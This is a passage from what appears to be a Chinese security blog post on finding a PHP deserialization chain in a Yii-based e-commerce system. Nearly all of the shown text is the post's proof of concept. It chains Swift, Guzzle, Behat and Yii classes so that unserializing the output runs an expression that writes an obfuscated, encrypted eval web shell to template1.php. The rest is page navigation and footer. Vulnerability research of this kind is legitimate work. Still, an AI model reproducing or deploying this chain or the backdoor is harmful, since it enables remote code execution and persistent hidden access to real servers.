class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace yii\caching&#123;</span><br><span class="line">    class ExpressionDependency&#123;</span><br><span class="line">        public $expression;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;expression=&#x27;file_put_contents(&quot;./template1.php&quot;,&quot;&lt;?pHP</span><br><span class="line">@session_start();</span><br><span class="line">@set_time_limit(Chr(\&quot;48\&quot;));</span><br><span class="line">@error_reporting/*fuckgovv4aqxTHvS2*/(Chr(\&quot;48\&quot;));</span><br><span class="line">function baiduxoQT5mlorCt(/*fuckgovoDDTh*/\$baiduE0tpwHWAmC,\$baiduVhMR)&#123;</span><br><span class="line">    for(\$baidu9MbYZG=Chr(\&quot;48\&quot;);\$baidu9MbYZG&lt;strlen(\$baiduE0tpwHWAmC);\$baidu9MbYZG++) &#123;</span><br><span class="line">        \$baidua1Z4cz = \$baiduVhMR[\$baidu9MbYZG+Chr(\&quot;49\&quot;)&amp;15];</span><br><span class="line">        \$baiduE0tpwHWAmC[\$baidu9MbYZG] = \$baiduE0tpwHWAmC[\$baidu9MbYZG]^\$baidua1Z4cz;</span><br><span class="line">    &#125;</span><br><span class="line">    return \$baiduE0tpwHWAmC;</span><br><span class="line">&#125;</span><br><span class="line">\$baiduzZQQjX3kI5QJ = \&quot;bas\&quot;.\&quot;e6\&quot;.Chr(\&quot;52\&quot;).\&quot;_\&quot;.\&quot;de\&quot;.\&quot;cod\&quot;.Chr(\&quot;101\&quot;);</span><br><span class="line">\$base64_baiduxoQT5mlorCt = \&quot;bas\&quot;.\&quot;e6\&quot;.Chr(\&quot;52\&quot;).\&quot;_e\&quot;.Chr(\&quot;110\&quot;).Chr(\&quot;99\&quot;).\&quot;ode\&quot;;</span><br><span class="line">\$baiduk2wU=(\&quot;&amp;\&quot;^\&quot;r\&quot;).(\&quot;7\&quot;^\&quot;V\&quot;).(\&quot;I\&quot;^\&quot;:\&quot;).(\&quot;p\&quot;^\&quot;I\&quot;).(\&quot;_\&quot;^\&quot;:\&quot;).\$baiduzZQQjX3kI5QJ(\$baiduzZQQjX3kI5QJ(\&quot;Y2c9PQ==\&quot;));</span><br><span class="line">\$baiduIKJP47aD3N2h=\&#x27;p\&#x27;.\$baiduzZQQjX3kI5QJ(\$baiduzZQQjX3kI5QJ(\&quot;WVhsc2IyRms=\&quot;));</span><br><span class="line">\$baiduo40ArI30MXpOh=\&#x27;5da27e29\&#x27;.\$baiduzZQQjX3kI5QJ(\&quot;OTQ5YjllZmY=\&quot;);</span><br><span class="line">\$baidueA6Qmqt1OY1dpQ=(\&quot;!\&quot;^\&quot;@\&quot;).\&#x27;ss\&#x27;.Chr(\&quot;101\&quot;).\&#x27;rs\&#x27;;</span><br><span class="line">\$baidueA6Qmqt1OY1dpQ++;</span><br><span class="line">if (isset(\$_POST/*fuckgov3mCAtR*/[\$baiduk2wU]))&#123;</span><br><span class="line">    \$datbaidueA6Qmqt1OY1dpQ=baiduxoQT5mlorCt/*fuckgovac5q7m4jr7COuYs*/(\$baiduzZQQjX3kI5QJ(\$_POST[\$baiduk2wU]),\$baiduo40ArI30MXpOh);</span><br><span class="line">    if (/*fuckgovXMeIqBm*/isset(\$_SESSION/*fuckgovyboolhlD*/[\$baiduIKJP47aD3N2h]))&#123;</span><br><span class="line">        \$baidu1TilWNsaOuFd6=baiduxoQT5mlorCt(\$_SESSION/*fuckgovZ5yrIVQc11MJwQ7*/[\$baiduIKJP47aD3N2h],\$baiduo40ArI30MXpOh);</span><br><span class="line">        if (/*fuckgovbfzWTi8VVJweWpR*/strpos(\$baidu1TilWNsaOuFd6,\$baiduzZQQjX3kI5QJ/*fuckgovNQ6hM9tkxpurUd*/(\$baiduzZQQjX3kI5QJ(\&quot;WjJWMFFtRnphV056U1c1bWJ3PT0=\&quot;)))===false)&#123;</span><br><span class="line">            \$baidu1TilWNsaOuFd6=baiduxoQT5mlorCt/*fuckgovJ8S2PNMXpD7l50g*/(\$baidu1TilWNsaOuFd6,\$baiduo40ArI30MXpOh);</span><br><span class="line">        &#125;</span><br><span class="line">        define(\&quot;baiduXMNuY8BGPxBwazP\&quot;,\&quot;//baiduQekmw\r\n\&quot;.\$baidu1TilWNsaOuFd6);</span><br><span class="line">        eval(baiduXMNuY8BGPxBwazP);</span><br><span class="line">        echo substr(/*fuckgov7eFT8HZkeSERjy*/md5/*fuckgovczn5VlPT3MtJE9O*/(\$baiduk2wU.\$baiduo40ArI30MXpOh),Chr(\&quot;48\&quot;),16);</span><br><span class="line">        echo \$base64_baiduxoQT5mlorCt(baiduxoQT5mlorCt(@run(\$datbaidueA6Qmqt1OY1dpQ),\$baiduo40ArI30MXpOh));</span><br><span class="line">        echo substr(/*fuckgov9BebET2KyiratDN*/md5/*fuckgovCnpB8Xt5QH*/(\$baiduk2wU.\$baiduo40ArI30MXpOh),16);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if (strpos/*fuckgovgXWkYn7xCQSm*/(\$datbaidueA6Qmqt1OY1dpQ,\$baiduzZQQjX3kI5QJ(\$baiduzZQQjX3kI5QJ(\&quot;WjJWMFFtRnphV056U1c1bWJ3PT0=\&quot;)))!==false)&#123;</span><br><span class="line">            \$_SESSION[\$baiduIKJP47aD3N2h]=baiduxoQT5mlorCt(\$datbaidueA6Qmqt1OY1dpQ,\$baiduo40ArI30MXpOh);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&quot;)&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace GuzzleHttp\Psr7&#123;</span><br><span class="line">    use Behat\Gherkin\Cache\MemoryCache;</span><br><span class="line">    use yii\caching\ExpressionDependency;</span><br><span class="line">    class PumpStream&#123;</span><br><span class="line">        private $size=-10;</span><br><span class="line">        private $source;</span><br><span class="line">        private $buffer;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;buffer=new MemoryCache();</span><br><span class="line">            $this-&gt;source=[new ExpressionDependency(),&#x27;evaluateDependency&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace Behat\Gherkin\Cache&#123;</span><br><span class="line">    class MemoryCache&#123;</span><br><span class="line">        private $features = array();</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;features[10]=123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace GuzzleHttp\Psr7&#123;</span><br><span class="line">    class BufferStream&#123;</span><br><span class="line">        private $buffer = &#x27;&#x27;;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;buffer=&quot;123&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace GuzzleHttp\Psr7&#123;</span><br><span class="line">    class CachingStream&#123;</span><br><span class="line">        private $remoteStream;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;remoteStream=new BufferStream();</span><br><span class="line">            $this-&gt;stream=new PumpStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace GuzzleHttp\Psr7&#123;</span><br><span class="line">    class AppendStream&#123;</span><br><span class="line">        private $streams = [];</span><br><span class="line">        private $seekable = true;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;streams[]=new CachingStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    use GuzzleHttp\Psr7\AppendStream;</span><br><span class="line">    class Swift_ByteStream_FileByteStream &#123;</span><br><span class="line">        private $path;</span><br><span class="line">        public function __construct() &#123;</span><br><span class="line">            $this-&gt;path = new AppendStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    echo urlencode(serialize(new Swift_ByteStream_TemporaryFileByteStream()));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">反序列化漏洞点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E7%8E%AF%E5%A2%83%E9%99%90%E5%88%B6"><span class="toc-number">2.</span> <span class="toc-text">目标环境限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98"><span class="toc-number">3.</span> <span class="toc-text">反序列化链挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TemporaryFileByteStream%E5%85%A5%E5%8F%A3%E7%82%B9"><span class="toc-number">3.1.</span> <span class="toc-text">TemporaryFileByteStream入口点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AppendStream"><span class="toc-number">3.2.</span> <span class="toc-text">AppendStream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CachingStream-rewind"><span class="toc-number">3.3.</span> <span class="toc-text">CachingStream-&gt;rewind()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PumpStream-read"><span class="toc-number">3.4.</span> <span class="toc-text">PumpStream-&gt;read()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ExpressionDependency-generateDependencyData"><span class="toc-number">3.5.</span> <span class="toc-text">ExpressionDependency-&gt;generateDependencyData()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BEpoc"><span class="toc-number">4.</span> <span class="toc-text">反序列化链poc</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/&text=记一次禾匠商城yii反序列化链挖掘"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/&title=记一次禾匠商城yii反序列化链挖掘"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/&is_video=false&description=记一次禾匠商城yii反序列化链挖掘"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记一次禾匠商城yii反序列化链挖掘&body=Check out this article: http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/&title=记一次禾匠商城yii反序列化链挖掘"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/&title=记一次禾匠商城yii反序列化链挖掘"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/&title=记一次禾匠商城yii反序列化链挖掘"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/&title=记一次禾匠商城yii反序列化链挖掘"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/&name=记一次禾匠商城yii反序列化链挖掘&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/&t=记一次禾匠商城yii反序列化链挖掘"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    N0poInt
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
